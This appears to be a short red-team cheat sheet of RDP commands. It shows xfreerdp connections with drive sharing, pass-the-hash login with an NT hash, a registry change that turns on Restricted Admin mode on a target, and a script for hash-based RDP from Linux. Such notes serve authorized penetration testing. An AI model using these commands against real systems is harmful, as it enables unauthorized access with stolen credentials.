# Standard RDP
xfreerdp /v:TARGET /u:user /p:password /cert:ignore +clipboard /drive:share,/tmp

# RDP with pass-the-hash (requires Restricted Admin mode)
xfreerdp /v:TARGET /u:user /pth:NT_HASH /cert:ignore

# Enable Restricted Admin on target (if not already)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f

# RDP from Linux with hash
python3 xfreerdp-pth.py TARGET -u user -p NT_HASH